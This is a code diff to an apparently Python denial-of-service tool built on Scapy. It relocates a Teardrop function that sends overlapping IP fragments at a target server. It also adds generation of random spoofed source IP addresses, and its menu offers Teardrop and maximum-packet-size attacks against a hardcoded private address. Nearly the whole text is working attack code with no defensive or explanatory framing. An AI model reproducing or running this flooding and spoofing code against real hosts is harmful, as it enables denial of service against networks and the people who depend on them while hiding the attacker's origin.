@@ -3,6 +3,8 @@ import random
 import threading
 import time
 from tqdm import tqdm
+import socket
+import struct
 
 # Global variables for tracking sent packets and time
 sent_packets = 0
@@ -19,6 +21,33 @@ def log_results(attack_type, packets_sent, duration):
         file.write(f"Packets Sent: {packets_sent}\n")
         file.write(f"Duration: {duration} seconds\n")
         file.write("=" * 50 + "\n")
+
+def generate_random_ip():
+    """
+    Generate a random IP address within a specific range.
+    """
+    return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
+
+def send_tear_drop_packet(server_ip, server_port, source_ips, count, progress_bar):
+    global sent_packets, start_time
+    while sent_packets < count:
+        source_ip = random.choice(source_ips)
+
+        # Create overlapping fragments for Tear Drop attack
+        frag1 = IP(src=source_ip, dst=server_ip, flags=1, frag=0) / UDP(dport=server_port) / Raw(RandString(size=1480))
+        frag2 = IP(src=source_ip, dst=server_ip, flags=1, frag=2) / UDP(dport=server_port) / Raw(RandString(size=1480))
+
+        send(frag1, verbose=0)
+        send(frag2, verbose=0)
+
+        with sent_packets_lock:
+            sent_packets += 1
+
+        progress_bar.update(1)
+        progress_bar.set_postfix(PacketsSent=sent_packets)
+
+        time.sleep(1) 
+        
 
 # Function representing the task to be performed in each thread
 def send_udp_packet(server_ip, server_port, source_ips, count, progress_bar):
@@ -43,32 +72,12 @@ def send_udp_packet(server_ip, server_port, source_ips, count, progress_bar):
 
         time.sleep(1)  # Update every second
 
-
-def send_tear_drop_packet(server_ip, server_port, source_ips, count, progress_bar):
-    global sent_packets, start_time
-    while sent_packets < count:
-        source_ip = random.choice(source_ips)
-
-        # Create overlapping fragments for Tear Drop attack
-        frag1 = IP(src=source_ip, dst=server_ip, flags=1, frag=0) / UDP(dport=server_port) / Raw(RandString(size=1480))
-        frag2 = IP(src=source_ip, dst=server_ip, flags=1, frag=2) / UDP(dport=server_port) / Raw(RandString(size=1480))
-
-        send(frag1, verbose=0)
-        send(frag2, verbose=0)
-
-        with sent_packets_lock:
-            sent_packets += 1
-
-        progress_bar.update(1)
-        progress_bar.set_postfix(PacketsSent=sent_packets)
-
-        time.sleep(1) 
-        
 # Main function
 def main():
     global start_time
     attack_number = int(input("Choose an attack: \n1. Tear Drop\n2. Maximum Packet Size\nEnter the attack number: "))
     number_of_packets = int(input("Enter the number of times to execute the attack: "))
+    number_of_source_ips = int(input("Enter the number of source IP addresses to generate: "))
 
     # Server IP and port (replace with actual values)
     server_ip = '192.168.119.130'
@@ -76,6 +85,10 @@ def main():
 
     # List of source IP addresses to use (replace with actual IPs)
     source_ips = ['192.168.1.100', '192.168.1.101', '192.168.1.102']
+
+    # Generate additional random source IP addresses
+    for _ in range(number_of_source_ips):
+        source_ips.append(generate_random_ip())
 
     start_time = time.time()  # Record the start time
 
@@ -110,7 +123,5 @@ def main():
     # Log attack results to a file
     log_results(attack_type, number_of_packets, attack_duration)
 
-
-        
 if __name__ == "__main__":
     main()
